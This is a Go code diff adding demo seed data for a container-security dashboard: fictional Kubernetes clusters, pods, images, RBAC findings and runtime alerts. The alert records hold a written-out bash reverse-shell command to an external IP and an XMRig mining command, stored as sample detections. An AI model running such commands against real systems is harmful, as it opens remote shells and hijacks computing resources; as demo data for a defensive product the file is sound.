@@ -162,6 +162,8 @@ func main() {
 	seedTenantsEnterprise(db)
 	log.Println("Seeding email security…")
 	seedEmailSecurity(db)
+	log.Println("Seeding container security…")
+	seedContainerSecurity(db)
 	log.Println("Demo seed complete.")
 }
 
@@ -2856,6 +2858,255 @@ func seedEmailSecurity(db *sql.DB) {
 			INSERT INTO email_policies (tenant_id, name, policy_type, action, criteria, enabled, priority)
 			VALUES (9999,$1,$2,$3,$4,true,$5)`,
 			p.name, p.ptype, p.action, p.criteria, p.priority,
+		)
+	}
+}
+
+func seedContainerSecurity(db *sql.DB) {
+	mustExec(db, `CREATE TABLE IF NOT EXISTS k8s_clusters (
+		id SERIAL PRIMARY KEY, tenant_id INTEGER NOT NULL,
+		name TEXT DEFAULT '', provider TEXT DEFAULT 'kubernetes',
+		k8s_version TEXT DEFAULT '', node_count INTEGER DEFAULT 0,
+		status TEXT DEFAULT 'healthy', region TEXT DEFAULT '',
+		risk_score INTEGER DEFAULT 0, compliance_score INTEGER DEFAULT 0,
+		last_scan TIMESTAMPTZ DEFAULT NOW(), created_at TIMESTAMPTZ DEFAULT NOW())`)
+	mustExec(db, `CREATE TABLE IF NOT EXISTS k8s_nodes (
+		id SERIAL PRIMARY KEY, tenant_id INTEGER NOT NULL,
+		cluster_id INTEGER DEFAULT 0, name TEXT DEFAULT '',
+		os TEXT DEFAULT '', kernel TEXT DEFAULT '',
+		cpu_cores INTEGER DEFAULT 0, memory_gb INTEGER DEFAULT 0,
+		pod_count INTEGER DEFAULT 0, runtime TEXT DEFAULT 'containerd',
+		risk_score INTEGER DEFAULT 0, vuln_count INTEGER DEFAULT 0,
+		status TEXT DEFAULT 'ready', last_heartbeat TIMESTAMPTZ DEFAULT NOW(),
+		created_at TIMESTAMPTZ DEFAULT NOW())`)
+	mustExec(db, `CREATE TABLE IF NOT EXISTS k8s_pods (
+		id SERIAL PRIMARY KEY, tenant_id INTEGER NOT NULL,
+		cluster_id INTEGER DEFAULT 0, namespace TEXT DEFAULT '',
+		name TEXT DEFAULT '', image TEXT DEFAULT '',
+		status TEXT DEFAULT 'running', is_privileged BOOLEAN DEFAULT false,
+		host_network BOOLEAN DEFAULT false, host_pid BOOLEAN DEFAULT false,
+		host_ipc BOOLEAN DEFAULT false, run_as_root BOOLEAN DEFAULT false,
+		read_only_fs BOOLEAN DEFAULT true, has_resource_limits BOOLEAN DEFAULT true,
+		capabilities TEXT DEFAULT '', volumes TEXT DEFAULT '',
+		risk_score INTEGER DEFAULT 0, created_at TIMESTAMPTZ DEFAULT NOW())`)
+	mustExec(db, `CREATE TABLE IF NOT EXISTS k8s_images (
+		id SERIAL PRIMARY KEY, tenant_id INTEGER NOT NULL,
+		image TEXT DEFAULT '', registry TEXT DEFAULT '',
+		tag TEXT DEFAULT '', base_image TEXT DEFAULT '',
+		os TEXT DEFAULT '', size_mb INTEGER DEFAULT 0,
+		cve_critical INTEGER DEFAULT 0, cve_high INTEGER DEFAULT 0,
+		cve_medium INTEGER DEFAULT 0, cve_low INTEGER DEFAULT 0,
+		has_secrets BOOLEAN DEFAULT false, malware_found BOOLEAN DEFAULT false,
+		signature_valid BOOLEAN DEFAULT false, sbom_available BOOLEAN DEFAULT false,
+		age_days INTEGER DEFAULT 0, risk_score INTEGER DEFAULT 0,
+		last_scanned TIMESTAMPTZ DEFAULT NOW(), created_at TIMESTAMPTZ DEFAULT NOW())`)
+	mustExec(db, `CREATE TABLE IF NOT EXISTS k8s_runtime_alerts (
+		id SERIAL PRIMARY KEY, tenant_id INTEGER NOT NULL,
+		cluster_id INTEGER DEFAULT 0, namespace TEXT DEFAULT '',
+		pod_name TEXT DEFAULT '', container_name TEXT DEFAULT '',
+		alert_type TEXT DEFAULT '', severity TEXT DEFAULT 'medium',
+		description TEXT DEFAULT '', process TEXT DEFAULT '',
+		command TEXT DEFAULT '', source_ip TEXT DEFAULT '',
+		mitre_technique TEXT DEFAULT '', status TEXT DEFAULT 'open',
+		created_at TIMESTAMPTZ DEFAULT NOW())`)
+	mustExec(db, `CREATE TABLE IF NOT EXISTS k8s_rbac_findings (
+		id SERIAL PRIMARY KEY, tenant_id INTEGER NOT NULL,
+		cluster_id INTEGER DEFAULT 0, kind TEXT DEFAULT '',
+		name TEXT DEFAULT '', namespace TEXT DEFAULT '',
+		subject TEXT DEFAULT '', permissions TEXT DEFAULT '',
+		finding_type TEXT DEFAULT '', severity TEXT DEFAULT 'medium',
+		description TEXT DEFAULT '', created_at TIMESTAMPTZ DEFAULT NOW())`)
+	mustExec(db, `CREATE TABLE IF NOT EXISTS k8s_network_policies (
+		id SERIAL PRIMARY KEY, tenant_id INTEGER NOT NULL,
+		cluster_id INTEGER DEFAULT 0, namespace TEXT DEFAULT '',
+		name TEXT DEFAULT '', policy_type TEXT DEFAULT 'ingress',
+		direction TEXT DEFAULT 'ingress', status TEXT DEFAULT 'active',
+		pod_selector TEXT DEFAULT '', peer TEXT DEFAULT '',
+		port TEXT DEFAULT '', created_at TIMESTAMPTZ DEFAULT NOW())`)
+	mustExec(db, `CREATE TABLE IF NOT EXISTS k8s_admission_violations (
+		id SERIAL PRIMARY KEY, tenant_id INTEGER NOT NULL,
+		cluster_id INTEGER DEFAULT 0, namespace TEXT DEFAULT '',
+		workload TEXT DEFAULT '', kind TEXT DEFAULT '',
+		violation_type TEXT DEFAULT '', severity TEXT DEFAULT 'high',
+		description TEXT DEFAULT '', action TEXT DEFAULT 'denied',
+		created_at TIMESTAMPTZ DEFAULT NOW())`)
+
+	var existing int
+	db.QueryRow(`SELECT COUNT(*) FROM k8s_clusters WHERE tenant_id=9999`).Scan(&existing)
+	if existing > 0 {
+		return
+	}
+
+	now := time.Now()
+
+	clusters := []struct {
+		name, provider, version, region, status string
+		nodeCount, risk, compliance             int
+	}{
+		{"prod-eks-us-east", "aws", "1.29", "us-east-1", "healthy", 3, 68, 74},
+		{"staging-gke", "gcp", "1.28", "us-central1", "degraded", 2, 52, 81},
+	}
+	clusterIDs := make([]int, len(clusters))
+	for i, cl := range clusters {
+		db.QueryRow(`
+			INSERT INTO k8s_clusters (tenant_id, name, provider, k8s_version, node_count, status, region, risk_score, compliance_score, last_scan)
+			VALUES (9999,$1,$2,$3,$4,$5,$6,$7,$8,$9) RETURNING id`,
+			cl.name, cl.provider, cl.version, cl.nodeCount, cl.status, cl.region, cl.risk, cl.compliance, now.Add(-90*time.Minute),
+		).Scan(&clusterIDs[i])
+	}
+
+	nodes := []struct {
+		clusterIdx                      int
+		name, os, kernel, runtime, stat string
+		cpu, mem, pods, risk, vulns     int
+	}{
+		{0, "ip-10-0-1-14.ec2.internal", "Amazon Linux 2", "5.10.220", "containerd", "ready", 4, 16, 12, 58, 3},
+		{0, "ip-10-0-1-27.ec2.internal", "Amazon Linux 2", "5.10.220", "containerd", "ready", 4, 16, 9, 41, 1},
+		{0, "ip-10-0-2-8.ec2.internal", "Amazon Linux 2", "5.10.198", "containerd", "not_ready", 4, 16, 0, 72, 5},
+		{1, "gke-staging-pool-1-abcd", "Container-Optimized OS", "5.15.0", "containerd", "ready", 2, 8, 6, 47, 2},
+		{1, "gke-staging-pool-1-efgh", "Container-Optimized OS", "5.15.0", "containerd", "ready", 2, 8, 5, 39, 0},
+	}
+	for _, n := range nodes {
+		db.Exec(`
+			INSERT INTO k8s_nodes (tenant_id, cluster_id, name, os, kernel, cpu_cores, memory_gb, pod_count, runtime, risk_score, vuln_count, status, last_heartbeat)
+			VALUES (9999,$1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12)`,
+			clusterIDs[n.clusterIdx], n.name, n.os, n.kernel, n.cpu, n.mem, n.pods, n.runtime, n.risk, n.vulns, n.stat, now.Add(-5*time.Minute),
+		)
+	}
+
+	pods := []struct {
+		clusterIdx                                                    int
+		namespace, name, image                                        string
+		privileged, hostNet, hostPID, hostIPC, root, readOnly, limits bool
+		risk                                                          int
+	}{
+		{0, "production", "web-app-7d9f6c-x2k1p", "docker.io/xcloak/webapp:1.2.3", false, false, false, false, false, true, true, 42},
+		{0, "production", "payments-api-58b7d-m9qz2", "gcr.io/xcloak-corp/payments-api:2.4.0", false, false, false, false, true, false, true, 71},
+		{0, "production", "log-forwarder-daemonset-9k2p1", "docker.io/fluent/fluent-bit:2.1", true, true, true, false, true, false, false, 88},
+		{0, "production", "orders-worker-6f8d9-p7x3q", "gcr.io/xcloak-corp/orders-worker:1.0.5", false, false, false, false, false, true, true, 38},
+		{0, "kube-system", "coredns-5d78c9869d-abc12", "registry.k8s.io/coredns/coredns:v1.11.1", false, false, false, false, false, true, true, 15},
+		{0, "kube-system", "aws-node-x7f2q", "public.ecr.aws/eks/aws-vpc-cni:v1.16.0", true, true, false, false, true, false, true, 62},
+		{0, "monitoring", "prometheus-server-0", "quay.io/prometheus/prometheus:v2.51.0", false, false, false, false, false, true, true, 22},
+		{1, "staging", "web-app-canary-6c9d8-q1x2", "docker.io/xcloak/webapp:1.3.0-rc1", false, false, false, false, false, true, false, 55},
+		{1, "staging", "debug-shell-privileged", "docker.io/library/ubuntu:20.04", true, true, true, true, true, false, false, 96},
+		{1, "staging", "redis-cache-master-0", "docker.io/library/redis:6.0", false, false, false, false, false, true, true, 34},
+		{1, "kube-system", "kube-proxy-9x1p2", "registry.k8s.io/kube-proxy:v1.28.3", true, true, false, false, true, false, true, 59},
+	}
+	for _, p := range pods {
+		db.Exec(`
+			INSERT INTO k8s_pods (tenant_id, cluster_id, namespace, name, image, status, is_privileged, host_network, host_pid, host_ipc, run_as_root, read_only_fs, has_resource_limits, risk_score, created_at)
+			VALUES (9999,$1,$2,$3,$4,'running',$5,$6,$7,$8,$9,$10,$11,$12,$13)`,
+			clusterIDs[p.clusterIdx], p.namespace, p.name, p.image, p.privileged, p.hostNet, p.hostPID, p.hostIPC, p.root, p.readOnly, p.limits, p.risk,
+			now.Add(-time.Duration(24+len(p.name))*time.Hour),
+		)
+	}
+
+	images := []struct {
+		image, registry, tag, base, os                 string
+		sizeMB, critical, high, medium, low, age, risk int
+		hasSecrets, malware, signed, sbom              bool
+	}{
+		{"xcloak/webapp", "docker.io", "1.2.3", "node:18-slim", "linux", 210, 1, 6, 14, 22, 40, 78, false, false, false, true},
+		{"xcloak-corp/payments-api", "gcr.io", "2.4.0", "golang:1.22-alpine", "linux", 85, 0, 2, 5, 9, 12, 45, false, false, true, true},
+		{"fluent/fluent-bit", "docker.io", "2.1", "alpine:3.18", "linux", 45, 0, 1, 3, 4, 200, 38, false, false, false, false},
+		{"xcloak-corp/orders-worker", "gcr.io", "1.0.5", "golang:1.22-alpine", "linux", 92, 0, 0, 2, 6, 8, 22, false, false, true, true},
+		{"coredns/coredns", "registry.k8s.io", "v1.11.1", "scratch", "linux", 18, 0, 0, 0, 1, 55, 8, false, false, true, false},
+		{"eks/aws-vpc-cni", "public.ecr.aws", "v1.16.0", "amazonlinux:2", "linux", 130, 0, 3, 8, 11, 95, 41, false, false, true, false},
+		{"prometheus/prometheus", "quay.io", "v2.51.0", "busybox:1.36", "linux", 260, 0, 1, 4, 7, 30, 25, false, false, false, false},
+		{"library/ubuntu", "docker.io", "20.04", "scratch", "linux", 78, 4, 12, 18, 20, 620, 94, true, true, false, false},
+		{"library/redis", "docker.io", "6.0", "debian:buster-slim", "linux", 105, 2, 8, 12, 15, 480, 68, false, false, false, false},
+		{"kube-proxy", "registry.k8s.io", "v1.28.3", "scratch", "linux", 70, 0, 0, 2, 3, 60, 18, false, false, true, false},
+		{"xmrig/xmrig", "docker.io", "latest", "alpine:3.14", "linux", 12, 5, 9, 3, 1, 400, 97, true, true, false, false},
+	}
+	for _, im := range images {
+		db.Exec(`
+			INSERT INTO k8s_images (tenant_id, image, registry, tag, base_image, os, size_mb, cve_critical, cve_high, cve_medium, cve_low, has_secrets, malware_found, signature_valid, sbom_available, age_days, risk_score, last_scanned)
+			VALUES (9999,$1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17)`,
+			im.image, im.registry, im.tag, im.base, im.os, im.sizeMB, im.critical, im.high, im.medium, im.low,
+			im.hasSecrets, im.malware, im.signed, im.sbom, im.age, im.risk, now.Add(-6*time.Hour),
+		)
+	}
+
+	alertTypes := []struct {
+		namespace, pod, container, atype, severity, desc, process, command, mitre string
+		hoursAgo                                                                  int
+	}{
+		{"staging", "debug-shell-privileged", "ubuntu", "reverse_shell", "critical", "Outbound shell spawned to external IP from a privileged debug pod.", "bash", "bash -i >& /dev/tcp/185.220.101.47/4444 0>&1", "T1059.004", 3},
+		{"staging", "debug-shell-privileged", "ubuntu", "crypto_mining", "high", "XMRig-pattern process detected consuming 98% CPU.", "xmrig", "./xmrig -o pool.minexmr.com:4444", "T1496", 6},
+		{"production", "log-forwarder-daemonset-9k2p1", "fluent-bit", "privilege_escalation", "high", "Container attempted to write to /proc/sys, blocked by seccomp.", "fluent-bit", "", "T1611", 20},
+		{"production", "web-app-7d9f6c-x2k1p", "webapp", "unexpected_network", "medium", "Outbound connection to non-allowlisted domain.", "node", "", "T1071", 30},
+		{"kube-system", "aws-node-x7f2q", "aws-vpc-cni", "file_tampering", "medium", "Unexpected write to /etc/cni/net.d detected.", "aws-vpc-cni", "", "T1565", 50},
+		{"production", "payments-api-58b7d-m9qz2", "payments-api", "unexpected_network", "high", "Connection attempt to known C2 IP blocked by network policy.", "payments-api", "", "T1071", 70},
+		{"staging", "web-app-canary-6c9d8-q1x2", "webapp", "container_escape", "critical", "runc CVE-2024-21626-pattern syscall sequence detected.", "runc", "", "T1611", 100},
+		{"kube-system", "kube-proxy-9x1p2", "kube-proxy", "privilege_escalation", "medium", "hostPID container observed enumerating host process table.", "kube-proxy", "", "T1057", 150},
+		{"monitoring", "prometheus-server-0", "prometheus", "unexpected_network", "low", "Scrape target outside declared service discovery config.", "prometheus", "", "T1046", 200},
+		{"production", "orders-worker-6f8d9-p7x3q", "orders-worker", "file_tampering", "low", "Modified binary detected in read-write layer.", "orders-worker", "", "T1565", 260},
+	}
+	for _, a := range alertTypes {
+		db.Exec(`
+			INSERT INTO k8s_runtime_alerts (tenant_id, cluster_id, namespace, pod_name, container_name, alert_type, severity, description, process, command, mitre_technique, status, created_at)
+			VALUES (9999,$1,$2,$3,$4,$5,$6,$7,$8,$9,$10,'open',$11)`,
+			clusterIDs[0], a.namespace, a.pod, a.container, a.atype, a.severity, a.desc, a.process, a.command, a.mitre,
+			now.Add(-time.Duration(a.hoursAgo)*time.Hour),
+		)
+	}
+
+	rbac := []struct {
+		kind, name, namespace, subject, permissions, findingType, severity, desc string
+	}{
+		{"ClusterRole", "cluster-admin-copy", "", "system:serviceaccount:production:web-app-sa", "*", "excessive_permissions", "critical", "ServiceAccount web-app-sa is bound to a role granting '*' on all resources."},
+		{"ClusterRoleBinding", "web-app-sa-binding", "", "system:serviceaccount:production:web-app-sa", "*", "wildcard_permissions", "critical", "ClusterRoleBinding grants wildcard verbs across all API groups."},
+		{"Role", "payments-secrets-reader", "production", "system:serviceaccount:production:payments-api-sa", "get,list,watch secrets", "excessive_permissions", "high", "ServiceAccount can read all secrets in the production namespace, not scoped to its own."},
+		{"ClusterRole", "node-debug", "", "system:serviceaccount:staging:debug-sa", "exec,create pods/exec", "excessive_permissions", "high", "ServiceAccount can exec into any pod cluster-wide."},
+		{"RoleBinding", "monitoring-view-binding", "monitoring", "system:serviceaccount:monitoring:prometheus-sa", "get,list,watch", "unused_binding", "low", "Binding references a role with no matching resources in this namespace."},
+		{"ClusterRoleBinding", "aws-node-binding", "", "system:serviceaccount:kube-system:aws-node", "*", "wildcard_permissions", "medium", "CNI ServiceAccount has broader permissions than required for its function."},
+		{"Role", "orders-worker-role", "production", "system:serviceaccount:production:orders-worker-sa", "get,list secrets,configmaps", "excessive_permissions", "medium", "ServiceAccount has access to secrets it does not read from at runtime."},
+	}
+	for _, r := range rbac {
+		db.Exec(`
+			INSERT INTO k8s_rbac_findings (tenant_id, cluster_id, kind, name, namespace, subject, permissions, finding_type, severity, description)
+			VALUES (9999,$1,$2,$3,$4,$5,$6,$7,$8,$9)`,
+			clusterIDs[0], r.kind, r.name, r.namespace, r.subject, r.permissions, r.findingType, r.severity, r.desc,
+		)
+	}
+
+	netpols := []struct {
+		clusterIdx                                                      int
+		namespace, name, ptype, direction, status, selector, peer, port string
+	}{
+		{0, "production", "web-app-ingress", "ingress", "ingress", "active", "app=web-app", "ingress-nginx", "8080/TCP"},
+		{0, "production", "payments-api-restrict", "ingress", "ingress", "active", "app=payments-api", "app=web-app", "8443/TCP"},
+		{0, "production", "default-deny-egress", "egress", "egress", "missing", "*", "-", "*"},
+		{1, "staging", "debug-shell-isolation", "ingress", "ingress", "warn", "app=debug-shell", "none configured", "*"},
+		{0, "kube-system", "coredns-allow-all", "ingress", "ingress", "active", "k8s-app=kube-dns", "*", "53/UDP"},
+	}
+	for _, np := range netpols {
+		db.Exec(`
+			INSERT INTO k8s_network_policies (tenant_id, cluster_id, namespace, name, policy_type, direction, status, pod_selector, peer, port)
+			VALUES (9999,$1,$2,$3,$4,$5,$6,$7,$8,$9)`,
+			clusterIDs[np.clusterIdx], np.namespace, np.name, np.ptype, np.direction, np.status, np.selector, np.peer, np.port,
+		)
+	}
+
+	admission := []struct {
+		clusterIdx                                               int
+		namespace, workload, kind, vtype, severity, desc, action string
+		hoursAgo                                                 int
+	}{
+		{1, "staging", "debug-shell-privileged", "Pod", "privileged_container", "critical", "Pod requests privileged:true — denied by PodSecurity policy 'restricted'.", "denied", 4},
+		{0, "production", "log-forwarder-daemonset", "DaemonSet", "host_network", "high", "DaemonSet requests hostNetwork:true.", "allowed", 20},
+		{0, "production", "web-app", "Deployment", "no_resource_limits", "medium", "Container spec has no CPU/memory limits set.", "allowed", 45},
+		{1, "kube-system", "kube-proxy", "DaemonSet", "host_pid", "high", "DaemonSet requests hostPID:true — required for its function, allowed with audit flag.", "allowed", 90},
+		{0, "production", "unknown-deploy-test", "Deployment", "disallowed_registry", "high", "Image references an unapproved registry (docker.io) for a production namespace.", "denied", 120},
+		{1, "staging", "root-test-pod", "Pod", "root_container", "medium", "Container runs as root (runAsNonRoot not set).", "denied", 150},
+		{0, "production", "payments-api", "Deployment", "no_resource_limits", "low", "Sidecar container missing memory limit.", "allowed", 200},
+	}
+	for _, v := range admission {
+		db.Exec(`
+			INSERT INTO k8s_admission_violations (tenant_id, cluster_id, namespace, workload, kind, violation_type, severity, description, action, created_at)
+			VALUES (9999,$1,$2,$3,$4,$5,$6,$7,$8,$9)`,
+			clusterIDs[v.clusterIdx], v.namespace, v.workload, v.kind, v.vtype, v.severity, v.desc, v.action,
+			now.Add(-time.Duration(v.hoursAgo)*time.Hour),
 		)
 	}
 }
